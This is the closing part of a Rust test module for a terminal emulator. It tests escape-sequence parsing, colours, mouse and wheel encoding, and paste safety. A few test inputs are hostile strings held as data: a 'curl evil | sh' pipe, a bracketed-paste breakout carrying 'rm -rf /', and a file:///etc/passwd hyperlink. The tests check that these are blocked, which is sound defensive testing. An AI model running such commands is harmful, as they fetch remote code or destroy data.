    ((rgb.r as i32) << 16) | ((rgb.g as i32) << 8) | (rgb.b as i32)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn row_str(t: &ClientTerm, y: usize) -> String {
        (0..t.state().cols as usize)
            .map(|x| char::from_u32(t.cell(x, y).codepoint).unwrap_or(' '))
            .collect()
    }

    #[test]
    fn prints_plain_text() {
        let mut t = ClientTerm::new(20, 5, 100);
        let st = t.write(b"hi");
        assert_eq!(t.cell(0, 0).codepoint, 'h' as u32);
        assert_eq!(t.cell(1, 0).codepoint, 'i' as u32);
        assert_eq!(st.cursor_x, 2);
    }

    #[test]
    fn cup_and_color() {
        let mut t = ClientTerm::new(20, 5, 100);
        let st = t.write(b"\x1b[2;3H\x1b[31mX");
        assert_eq!(st.cursor_y, 1);
        assert_eq!(st.cursor_x, 3);
        assert_eq!(t.cell(2, 1).codepoint, 'X' as u32);
        assert_eq!(t.cell(2, 1).fg, ANSI_PALETTE[1]);
        assert_eq!(t.cell(2, 1).fg_index, 1);
    }

    #[test]
    fn wraps_and_decawm() {
        let mut t = ClientTerm::new(4, 3, 100);
        let st = t.write(b"abcde");
        assert_eq!(row_str(&t, 0), "abcd");
        assert_eq!(t.cell(0, 1).codepoint, 'e' as u32);
        assert_eq!(st.cursor_x, 1);
        assert_eq!(st.cursor_y, 1);

        let mut t2 = ClientTerm::new(4, 3, 100);
        let st2 = t2.write(b"\x1b[?7labcde");
        assert_eq!(row_str(&t2, 0), "abce");
        assert_eq!(t2.cell(0, 1).codepoint, ' ' as u32);
        assert_eq!(st2.cursor_x, 3);
        assert_eq!(st2.cursor_y, 0);
    }

    #[test]
    fn colon_subparams_and_non_sgr_colon() {
        let mut t = ClientTerm::new(40, 5, 100);
        t.write(b"\x1b[4:3mA\x1b[4:0mB\x1b[38:2::10:20:30mC\x1b[48:2:40:50:60mD\x1b[38:5:196mE");
        assert_eq!(row_str(&t, 0).trim_end(), "ABCDE");
        assert_eq!(t.cell(0, 0).attrs & attr::UNDERLINE, attr::UNDERLINE);
        assert_eq!(t.cell(1, 0).attrs & attr::UNDERLINE, 0);
        assert_eq!(t.cell(2, 0).fg, (10 << 16) | (20 << 8) | 30);
        assert_eq!(t.cell(3, 0).bg, (40 << 16) | (50 << 8) | 60);
        assert_eq!(t.cell(4, 0).fg, indexed_color(196));

        let mut t2 = ClientTerm::new(40, 5, 100);
        t2.write(b"ab\x1b[1:2HX");
        assert_eq!(row_str(&t2, 0).trim_end(), "abX");
    }

    #[test]
    fn dec_special_graphics_box_drawing() {
        let mut t = ClientTerm::new(10, 2, 100);
        t.write(b"\x1b(0lqqk\x1b(B");
        assert_eq!(row_str(&t, 0).trim_end(), "┌──┐");
    }

    #[test]
    fn copy_viewport_and_encode_paste() {
        let mut t = ClientTerm::new(6, 3, 100);
        t.write("ab\r\nc中\x1b[?2004h".as_bytes());
        assert_eq!(t.copy_viewport(0, 0, 2, 1), "ab\nc中");
        assert_eq!(t.encode_paste("a\nb"), b"\x1b[200~a\rb\x1b[201~");
    }

    #[test]
    fn tracks_kitty_keyboard_mode_stack_and_alt_screen_isolation() {
        let mut t = ClientTerm::new(20, 5, 100);
        assert_eq!(t.state().kitty_keyboard_flags, 0);

        // 跨分块推入 CSI > 3 u (DISAMBIGUATE_ESC_CODES | REPORT_EVENT_TYPES)
        t.write(b"\x1b[>");
        let st = t.write(b"3u");
        assert_eq!(st.kitty_keyboard_flags, 3);

        // 进入 alt-screen，压入 CSI > 1 u，再退出 alt-screen 应恢复主屏的 3
        t.write(b"\x1b[?1049h\x1b[>1u");
        assert_eq!(t.state().kitty_keyboard_flags, 1);
        let st_back = t.write(b"\x1b[?1049l");
        assert_eq!(st_back.kitty_keyboard_flags, 3);

        // 弹出栈恢复为 0
        let st_pop = t.write(b"\x1b[<1u");
        assert_eq!(st_pop.kitty_keyboard_flags, 0);
    }

    #[test]
    fn encode_paste_strips_nested_esc_breakout_and_flags_unbracketed_multiline() {
        let mut t = ClientTerm::new(20, 5, 100);
        // 未开启 bracketed paste 时，包含 \n 或 \r 需确认
        assert!(t.paste_requires_confirmation("curl evil | sh\n"));
        assert!(t.paste_requires_confirmation("curl evil | sh\r"));
        assert!(!t.paste_requires_confirmation("plain single line"));

        // 开启 bracketed paste 后，多行无需确认，但嵌套 \x1b[20\x1b[201~1~ 必须被彻底剥离 ESC
        t.write(b"\x1b[?2004h");
        assert!(!t.paste_requires_confirmation("line1\nline2"));
        let malicious = "safe\x1b[20\x1b[201~1~; rm -rf /\n";
        let encoded = t.encode_paste(malicious);
        let s = String::from_utf8(encoded).unwrap();
        assert!(s.starts_with("\x1b[200~"));
        assert!(s.ends_with("\x1b[201~"));
        let inner = &s["\x1b[200~".len()..s.len() - "\x1b[201~".len()];
        assert!(!inner.contains('\x1b'), "inner payload still contains ESC: {inner:?}");
    }

    #[test]
    fn preserves_fancy_underline_flags_and_validates_osc8_hyperlinks() {
        let mut t = ClientTerm::new(40, 5, 100);
        t.write(b"\x1b[4:3mU\x1b[4:2mD\x1b[0m");
        assert_ne!(t.cell(0, 0).attrs & attr::UNDERCURL, 0);
        assert_ne!(t.cell(0, 0).attrs & attr::UNDERLINE, 0);
        assert_ne!(t.cell(1, 0).attrs & attr::DOUBLE_UNDERLINE, 0);

        // 合法 https 链接允许返回，恶意 file:// 或 javascript: 或含控制字符链接被拦截
        t.write(b"\x1b]8;;https://example.com/docs\x1b\\A\x1b]8;;\x1b\\");
        t.write(b"\x1b]8;;file:///etc/passwd\x1b\\B\x1b]8;;\x1b\\");
        assert_eq!(
            t.hyperlink_at(2, 0).as_deref(),
            Some("https://example.com/docs")
        );
        assert_ne!(t.cell(2, 0).attrs & attr::HYPERLINK, 0);
        assert_eq!(t.hyperlink_at(3, 0), None);
    }

    #[test]
    fn tracks_alt_screen_in_state() {
        let mut t = ClientTerm::new(20, 5, 100);
        assert!(!t.state().alt_screen);
        assert!(t.write(b"\x1b[?1049h").alt_screen);
        assert!(!t.write(b"\x1b[?1049l").alt_screen);
    }

    #[test]
    fn encode_wheel_handles_mouse_sgr_x10_and_alternate_scroll() {
        let mut t = ClientTerm::new(20, 5, 100);
        assert_eq!(t.encode_wheel(2, 1, 1), None);
        assert_eq!(t.encode_wheel(2, 1, 0), None);

        // SGR mouse tracking: wheel up (64) and wheel down (65), clamped to max 10 repeats
        t.write(b"\x1b[?1000;1006h");
        assert_eq!(
            t.encode_wheel(2, 1, 2),
            Some(b"\x1b[<64;3;2M\x1b[<64;3;2M".to_vec())
        );
        assert_eq!(
            t.encode_wheel(0, 0, -1),
            Some(b"\x1b[<65;1;1M".to_vec())
        );
        let capped = t.encode_wheel(0, 0, 25).unwrap();
        assert_eq!(capped, b"\x1b[<64;1;1M".repeat(10));

        // Legacy X10 mouse wheel (no SGR)
        t.write(b"\x1b[?1006l");
        assert_eq!(
            t.encode_wheel(0, 0, 1),
            Some(vec![0x1b, b'[', b'M', 64 + 32, 33, 33])
        );
        assert_eq!(
            t.encode_wheel(0, 0, -1),
            Some(vec![0x1b, b'[', b'M', 65 + 32, 33, 33])
        );

        // Normal screen scrolled into history defers to local scrollback first
        t.write(b"\x1b[?1000l");
        t.write(b"1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n7");
        t.scroll_by(2);
        t.write(b"\x1b[?1000;1006h");
        assert_eq!(t.encode_wheel(0, 0, -1), None);
        t.scroll_to_bottom();
        assert_eq!(t.encode_wheel(0, 0, -1), Some(b"\x1b[<65;1;1M".to_vec()));

        // Alt screen without mouse tracking: ALTERNATE_SCROLL sends arrows
        t.write(b"\x1b[?1000l\x1b[?1049h");
        assert_eq!(t.encode_wheel(0, 0, 2), Some(b"\x1b[A\x1b[A".to_vec()));
        assert_eq!(t.encode_wheel(0, 0, -1), Some(b"\x1b[B".to_vec()));
        // With APP_CURSOR (?1h), sends SS3 arrows
        t.write(b"\x1b[?1h");
        assert_eq!(t.encode_wheel(0, 0, 1), Some(b"\x1bOA".to_vec()));
        assert_eq!(t.encode_wheel(0, 0, -1), Some(b"\x1bOB".to_vec()));
        // Disabling ALTERNATE_SCROLL (?1007l) returns None
        t.write(b"\x1b[?1007l");
        assert_eq!(t.encode_wheel(0, 0, 1), None);
    }

    #[test]
    fn word_and_line_bounds_handle_ascii_delimiters_wide_chars_and_scroll() {
        let mut t = ClientTerm::new(24, 3, 100);
        t.write("  (src/main.rs) 你好!\r\n\r\nline3\r\nline4".as_bytes());
        // Viewport currently shows row 0 = "", row 1 = "line3", row 2 = "line4"
        assert_eq!(t.word_bounds_at(0, 0), None);
        assert_eq!(t.line_bounds_at(0), None);
        assert_eq!(t.word_bounds_at(2, 1), Some((0, 4)));
        assert_eq!(t.line_bounds_at(1), Some((0, 4)));

        // Scroll up 1 line to reveal "  (src/main.rs) 你好!" at row 0
        t.scroll_by(1);
        assert_eq!(t.word_bounds_at(0, 0), None); // leading space
        assert_eq!(t.word_bounds_at(2, 0), Some((2, 2))); // '(' delimiter
        assert_eq!(t.word_bounds_at(6, 0), Some((3, 13))); // "src/main.rs"
        // '你' occupies cols 16..=17, '好' occupies cols 18..=19, '!' at 20
        assert_eq!(t.word_bounds_at(16, 0), Some((16, 19)));
        assert_eq!(t.word_bounds_at(17, 0), Some((16, 19))); // spacer of '你'
        assert_eq!(t.word_bounds_at(19, 0), Some((16, 19))); // spacer of '好'
        assert_eq!(t.line_bounds_at(0), Some((2, 20)));
        assert_eq!(t.word_bounds_at(99, 0), None);
        assert_eq!(t.line_bounds_at(99), None);
    }
}
